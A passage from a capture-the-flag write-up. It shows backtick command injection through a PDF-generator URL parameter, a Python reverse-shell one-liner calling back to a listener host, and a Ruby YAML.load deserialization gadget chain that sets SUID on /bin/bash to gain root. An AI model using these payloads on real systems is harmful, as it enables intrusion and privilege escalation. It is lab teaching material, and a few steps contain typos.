```bash
python3 -m http.server 8000
```

We then provide `http.LOCALIP:8000/` to the input bar and we get a pdf file.

### Payload

We now know that:

> The application could be vulnerable if it tries to render a URL that contains query string parameters with user input.

With that in mind we craft the payload. We can use the backticks to inject our command to the url. Let's test it with executing the id command.

```
http://LOCALIP:8000/?name=%20`id`
```

After clicking submit we see that the command is executed and shown in the PDF file that is created.

We are now ready to craft our payload using a python reverse shell one liner that spawns a shell. In the meantime we open a listener with netcat.

```bash
nc -lnvp 4444
```

The python reverse shell:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LOCALIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

The final URL:

```
http://LOCALIP:8000/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LOCALIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```

Clicking submit results in getting a reverse shell as user ruby.

Running `sudo -l` provides us with some interesting information:

### update_dependencies.rb

We need to find what the file `update_dependencies.rb` is about.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

The file above is a ruby script that takes a file called `dependencies.yml` through the `YAML.load` fuction and parses it while comparing the versions of ruby gems the file contains with the local installed versions.

In the `/opt` directory we also find a folder `/sample` that contains the `dependencies.yml` file shown bellow.

```yaml
yaml: 0.1.0
pdfkit: 1.0.1
```

When in `/sample` directory we can run the `update_dependencies.rb` script and see the compared versions.

## Gaining Root Access

In order to get a shell with admin priviledges we need to utilize a vulnerability in the `update_dependencies.rb` file. Specifically the function `YAML.load` is vulnerable to a Deserialization Attack attack as mentioned here.

First we create a directory somewhere at `/tmp` in order to create files and test things unbothered. Then we create a file called `dependencies.yml` and input the following script designed to exploit the unsafe `YAML.load` function.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

Through the `git_set:` variable we can input whatever command we want to execute and since henry can run `update_dependencies.rb` as root the command will also be executed with root privileges.

One way to get a bash shell with admin privileges is to change the permissions of the `/bin/bash` binary to <abbr title="SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it.">SUID</abbr>. In order to do that we add the following command in the file above `chmod +s /bin/bash`.

Finally we run `/bin/bash -p` and we get the elevated shell.

```bash
/bin.bash -p
cat /root.txt
```

And we got the root flag!
